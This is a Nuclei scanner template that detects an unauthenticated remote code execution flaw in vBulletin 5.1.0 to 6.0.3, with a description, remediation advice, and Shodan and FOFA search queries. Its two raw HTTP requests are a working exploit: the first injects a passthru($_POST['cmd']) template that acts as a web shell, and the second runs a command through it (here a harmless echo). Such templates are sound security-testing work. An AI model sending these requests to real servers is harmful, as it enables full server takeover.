id: vbulletin-replacead-rce

info:
  name: vBulletin replaceAdTemplate - Remote Code Execution
  author: DhiyaneshDK
  severity: critical
  description: |
    vBulletin versions 5.1.0 through 6.0.3 contain a Remote Code Execution (RCE) vulnerability in the ajax/api/ad/replaceAdTemplate endpoint. This flaw arises from improper use of PHPâ€™s Reflection API, allowing unauthenticated attackers to invoke protected controller methods. By injecting a crafted <vb:if> conditional that executes arbitrary PHP code via passthru($_POST[<param>]), and triggering it with a second request to ajax/render/ad_<location>, attackers can run arbitrary commands on the server as the webserver user.
  impact: |
    Successful exploitation allows unauthenticated remote attackers to execute arbitrary system commands as the web server user, resulting in full system compromise.
  remediation: |
    Upgrade to vBulletin 6.0.4+ and apply the official patch to restrict access to protected controller methods and secure the ajax/api/ad/replaceAdTemplate endpoint.
  reference:
    - https://karmainsecurity.com/pocs/vBulletin-replaceAdTemplate-RCE.php
    - https://karmainsecurity.com/dont-call-that-protected-method-vbulletin-rce
  metadata:
    verified: true
    max-request: 1
    fofa-query: app="vBulletin"
    shodan-query: http.component:"vBulletin"
  tags: rce,vbulletin,intrusive

variables:
  string: "{{to_lower(rand_base(5))}}"
  value: "{{to_lower(rand_text_alpha(5))}}"

http:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        routestring=ajax/api/ad/replaceAdTemplate&styleid=1&location={{string}}&template=<vb:if condition='"passthru"($_POST["cmd"])'></vb:if>

    matchers:
      - type: dsl
        dsl:
          - 'contains(content_type,"application/json")'
          - 'status_code == 200'
        condition: and
        internal: true

  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        routestring=ajax/render/ad_{{string}}&cmd=echo+{{value}}

    matchers:
      - type: dsl
        dsl:
          - 'contains_all(body,"template","{{value}}")'
          - 'contains(content_type,"application/json")'
          - 'status_code == 200'
        condition: and
